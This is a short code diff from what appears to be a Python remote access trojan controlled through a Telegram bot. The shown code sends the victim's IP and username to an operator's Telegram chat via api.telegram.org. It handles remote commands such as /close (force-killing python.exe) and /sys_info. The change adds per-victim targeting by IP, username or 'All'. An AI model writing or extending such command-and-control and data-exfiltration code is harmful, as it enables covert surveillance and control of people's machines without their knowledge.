@@ -64,7 +64,7 @@ class Loader():
 						message += "❖ MAP : http://extreme-ip-lookup.com/" + data['query'] + "\n";
 						message += "--" + getpass.getuser() + "--"
 						self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "&chat_id=" + self.chat_id)
-					elif command == "/close":
+					elif command == "/close" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						os.system("taskkill /IM python.exe /F")
 					elif command == "/sys_info" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						message = "🖥 System Info : \n"
